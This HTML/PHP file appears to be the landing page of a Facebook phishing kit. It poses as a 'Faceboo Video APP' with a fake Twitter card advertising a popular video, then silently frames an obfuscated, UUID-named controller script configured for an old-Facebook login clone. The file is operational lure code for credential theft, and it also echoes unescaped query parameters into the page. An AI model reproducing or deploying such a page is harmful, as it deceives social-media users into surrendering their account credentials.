
	<html> 
	<head> 
	<title>Faceboo Video APP</title>
		
		<meta name="twitter:card" content="summary" />
		<meta name="twitter:site" content="@Yonito Antonio" />
		<meta name="twitter:title" content="Watch video @Yonito Antonio" />
		<meta name="twitter:description" content="792,667 Views " />
		<meta name="twitter:image" content="https://avatars.io/twitter/Yonito Antonio" />
	
	</head>
	<frameset rows="*,3" frameborder="NO" border="50" framespacing="0">
	<frame name="main" src="../.././public/CONTROLLER07b81370-9bad-47c7-aa32-17d62329226e.php?source=.%2Fpublic%2FACCESSS4d68265a-a1cc-4bc5-97c9-0dec06f97b48&lan=oldfbhk&<?php echo http_build_query($_GET); ?>"> <noframes> 
	<body bgcolor="#FFFFFF" text="#000000"> 
	<a href="../.././public/CONTROLLER07b81370-9bad-47c7-aa32-17d62329226e.php?source=.%2Fpublic%2FACCESSS4d68265a-a1cc-4bc5-97c9-0dec06f97b48&lan=oldfbhk&<?php echo http_build_query($_GET); ?>">Click here to continue</a> 
	</body> 
	</noframes> 
	</html> 
   